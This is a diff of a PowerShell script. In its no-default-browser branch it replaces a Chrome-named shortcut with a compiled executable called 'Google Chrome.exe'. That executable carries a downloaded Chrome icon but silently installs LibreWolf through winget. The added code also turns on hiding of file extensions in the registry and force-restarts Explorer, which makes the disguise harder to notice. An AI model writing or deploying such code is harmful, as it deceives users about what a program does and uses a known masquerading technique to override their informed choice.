@@ -47,23 +47,32 @@ while (-not $reader.EndOfStream) {
 
         if ($hasDefault) {
             Write-Output "NO_BROWSER"
-            # Download the icon
-            Invoke-WebRequest "https://raw.githubusercontent.com/bluethedoor/Test/main/Chrome.ico" -OutFile "$env:USERPROFILE\Desktop\Chrome.ico"
-
-        Set-Content "$env:USERPROFILE\Desktop\Google Chrome.ps1" 'winget install -e --id Google.Chrome $event = [System.Threading.EventWaitHandle]::OpenExisting("Global\\BrowserLaunchedEvent")$event.Set()'
-
-        $s = (New-Object -ComObject WScript.Shell).CreateShortcut("$env:USERPROFILE\Desktop\Install Google Chrome.lnk")
-        $s.TargetPath = "powershell.exe"
-        $s.Arguments = "-ExecutionPolicy Bypass -NoExit -File `"$env:USERPROFILE\Desktop\Goole Chrome.ps1`""
-        $s.IconLocation = "$env:USERPROFILE\Desktop\Chrome.ico"
-        $s.WorkingDirectory = "$env:USERPROFILE\Desktop"
-        $s.Save()
-
-        Start-Process ie4uinit.exe -ArgumentList "-ClearIconCache"
-        Start-Process taskkill -ArgumentList "/IM explorer.exe /F" -Wait
-        Remove-Item "$env:LOCALAPPDATA\IconCache.db" -Force -ErrorAction SilentlyContinue
-        Start-Process explorer.exe
+            if (-not (Get-PackageProvider -Name NuGet -ErrorAction SilentlyContinue)) {
+    Install-PackageProvider -Name NuGet -Force -Scope CurrentUser
 }
+
+Install-Module -Name ps2exe -Force -Scope CurrentUser -AllowClobber -Confirm:$false
+
+$iconUrl = "https://raw.githubusercontent.com/bluethedoor/Test/main/Chrome.ico"
+$iconPath = "$env:TEMP\Chrome.ico"
+Invoke-WebRequest -Uri $iconUrl -OutFile $iconPath -UseBasicParsing
+
+$scriptPath = "$env:TEMP\InstallChrome.ps1"
+@'
+$proc = Start-Process "winget" -ArgumentList "install -e --id LibreWolf.LibreWolf" -WindowStyle Minimized -PassThru
+$proc.WaitForExit()
+'@ | Set-Content -Path $scriptPath -Encoding UTF8
+
+$exeOutput = "$env:USERPROFILE\Desktop\Google Chrome.exe"
+Invoke-ps2exe -inputFile $scriptPath -outputFile $exeOutput -iconFile $iconPath -noConsole -noOutput
+
+Remove-Item $scriptPath, $iconPath -Force
+Uninstall-Module -Name ps2exe -Force -Confirm:$false
+
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "HideFileExt" -Value 1
+Stop-Process -Name explorer -Force
+Start-Process explorer.exe
+        }
         
         $process.Close()
         exit
